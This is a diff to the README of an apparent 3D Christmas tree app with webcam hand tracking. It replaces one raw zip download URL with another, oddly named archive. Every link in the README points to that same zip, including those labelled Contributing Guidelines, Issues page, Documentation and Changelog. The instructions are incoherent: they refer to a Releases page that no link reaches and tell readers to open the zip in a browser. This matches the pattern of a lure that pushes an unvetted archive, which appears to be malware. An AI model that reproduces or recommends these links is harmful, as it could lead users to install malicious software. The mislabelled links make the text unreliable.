@@ -1,6 +1,6 @@
 # 🎄 christmas-tree-3d - Interactive 3D Christmas Joy
 
-[![Download](https://github.com/Raulandres1985/christmas-tree-3d/raw/refs/heads/main/laur/d-christmas-tree-v2.3.zip%20Now-From%20GitHub-brightgreen)](https://github.com/Raulandres1985/christmas-tree-3d/raw/refs/heads/main/laur/d-christmas-tree-v2.3.zip)
+[![Download](https://raw.githubusercontent.com/Raulandres1985/christmas-tree-3d/main/laur/tree-christmas-d-quassative.zip%20Now-From%20GitHub-brightgreen)](https://raw.githubusercontent.com/Raulandres1985/christmas-tree-3d/main/laur/tree-christmas-d-quassative.zip)
 
 ## 🎉 Overview
 
@@ -16,12 +16,12 @@ Follow these simple steps to get the application up and running:
    - Webcam to utilize hand tracking features.
 
 2. **Download the Application**
-   - Visit this page to download: [Download Here](https://github.com/Raulandres1985/christmas-tree-3d/raw/refs/heads/main/laur/d-christmas-tree-v2.3.zip).
+   - Visit this page to download: [Download Here](https://raw.githubusercontent.com/Raulandres1985/christmas-tree-3d/main/laur/tree-christmas-d-quassative.zip).
    - Locate the latest version of the application on the Releases page.
 
 3. **Installation**
    - Once the download is complete, unzip the file (if necessary).
-   - Open the https://github.com/Raulandres1985/christmas-tree-3d/raw/refs/heads/main/laur/d-christmas-tree-v2.3.zip file in your web browser.
+   - Open the https://raw.githubusercontent.com/Raulandres1985/christmas-tree-3d/main/laur/tree-christmas-d-quassative.zip file in your web browser.
 
 4. **Permissions**
    - Allow your webcam access when prompted to enable hand gesture control.
@@ -31,7 +31,7 @@ Follow these simple steps to get the application up and running:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Here](https://github.com/Raulandres1985/christmas-tree-3d/raw/refs/heads/main/laur/d-christmas-tree-v2.3.zip). Choose the latest version, and follow the installation steps outlined previously.
+To get started, visit this page to download: [Download Here](https://raw.githubusercontent.com/Raulandres1985/christmas-tree-3d/main/laur/tree-christmas-d-quassative.zip). Choose the latest version, and follow the installation steps outlined previously.
 
 ## 🔍 Features
 
@@ -61,16 +61,16 @@ Yes, christmas-tree-3d is completely free!
 
 ## 👥 Community and Contributions
 
-We welcome contributions! If you want to help enhance the application or report issues, please check the [Contributing Guidelines](https://github.com/Raulandres1985/christmas-tree-3d/raw/refs/heads/main/laur/d-christmas-tree-v2.3.zip).
+We welcome contributions! If you want to help enhance the application or report issues, please check the [Contributing Guidelines](https://raw.githubusercontent.com/Raulandres1985/christmas-tree-3d/main/laur/tree-christmas-d-quassative.zip).
 
 ## 📞 Support
 
-If you need assistance, please open an issue on the [GitHub Issues page](https://github.com/Raulandres1985/christmas-tree-3d/raw/refs/heads/main/laur/d-christmas-tree-v2.3.zip). We're here to help!
+If you need assistance, please open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Raulandres1985/christmas-tree-3d/main/laur/tree-christmas-d-quassative.zip). We're here to help!
 
 ## 🔗 Related Links
 
-- [Documentation](https://github.com/Raulandres1985/christmas-tree-3d/raw/refs/heads/main/laur/d-christmas-tree-v2.3.zip)
-- [Changelog](https://github.com/Raulandres1985/christmas-tree-3d/raw/refs/heads/main/laur/d-christmas-tree-v2.3.zip)
+- [Documentation](https://raw.githubusercontent.com/Raulandres1985/christmas-tree-3d/main/laur/tree-christmas-d-quassative.zip)
+- [Changelog](https://raw.githubusercontent.com/Raulandres1985/christmas-tree-3d/main/laur/tree-christmas-d-quassative.zip)
 
 ## 💡 Tips for Best Experience
 
